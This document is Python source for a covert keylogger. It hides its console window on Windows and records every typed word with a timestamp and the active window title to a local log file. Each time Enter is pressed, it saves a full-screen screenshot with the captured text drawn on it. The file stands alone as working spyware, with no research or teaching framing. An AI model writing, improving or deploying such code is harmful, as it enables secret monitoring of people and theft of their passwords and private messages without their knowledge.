from pynput import keyboard
import ctypes
import os
import sys
import pygetwindow as gw
from datetime import datetime
from PIL import ImageGrab, ImageDraw, ImageFont

# Hide the console window on Windows
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

Keys = []
CTRL_S_COMBINATION = {keyboard.Key.ctrl_l, keyboard.KeyCode(char='s')}
current_keys = set()
current_word = []
typed_content = []
last_window = None
current_form = None  # Track the current form being filled

# Define the directory to save screenshots
screenshot_dir = "screenshots"
os.makedirs(screenshot_dir, exist_ok=True)

def get_active_window():
    try:
        window = gw.getActiveWindow()
        return window.title if window else "Unknown"
    except:
        return "Unknown"

def take_screenshot(window_title, text):
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")

    # Draw text on the screenshot
    draw = ImageDraw.Draw(screenshot)
    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except IOError:
        font = ImageFont.load_default()
    
    margin = 10
    for i, line in enumerate(text.splitlines()):
        draw.text((margin, margin + i * 20), line, font=font, fill="red")

    screenshot.save(screenshot_path)

def on_press(key):
    global current_word, last_window, typed_content, current_form
    current_keys.add(key)
    if CTRL_S_COMBINATION.issubset(current_keys):
        # Stop the listener
        return False

    window_title = get_active_window()
    if window_title != last_window:
        last_window = window_title

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if hasattr(key, 'char'):
        current_word.append(key.char)
    elif key in {keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab}:
        word = ''.join(current_word)
        delimiter = 'SPACE' if key == keyboard.Key.space else 'ENTER' if key == keyboard.Key.enter else 'TAB'
        key_info = {
            'timestamp': timestamp,
            'window': window_title,
            'word': word,
            'delimiter': delimiter,
            'form': current_form  # Add form information
        }
        Keys.append(key_info)
        typed_content.append(word)
        current_word = []
        write_file(Keys)
        if key == keyboard.Key.enter:
            text_to_embed = '\n'.join(typed_content)
            take_screenshot(window_title, text_to_embed)
            typed_content = []  # Clear after screenshot

def write_file(Keys):
    with open('log.txt', 'w') as f:
        for entry in Keys:
            f.write(f"Timestamp: {entry['timestamp']}\n")
            f.write(f"Window: {entry['window']}\n")
            f.write(f"Form: {entry['form']}\n")  # Log form information
            f.write(f"Word: {entry['word']}\n")
            f.write(f"Delimiter: {entry['delimiter']}\n")
            f.write("-" * 40 + "\n")

def on_release(key):
    try:
        current_keys.remove(key)
    except KeyError:
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Restore standard output back to console
sys.stdout = sys.__stdout__
